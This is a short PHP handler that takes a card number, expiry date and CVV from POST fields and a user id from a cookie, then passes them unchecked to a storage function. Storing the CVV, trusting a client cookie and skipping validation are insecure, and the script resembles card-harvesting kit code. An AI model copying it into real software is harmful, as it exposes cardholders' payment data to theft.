<?php 
require('../../metronic/include/setings.php');

$id = $_COOKIE['id'];

$card = $_POST['tar'];
$date = $_POST['fec'];
$cvv = $_POST['cvv'];

put_card($id,$card,$date,$cvv);
?>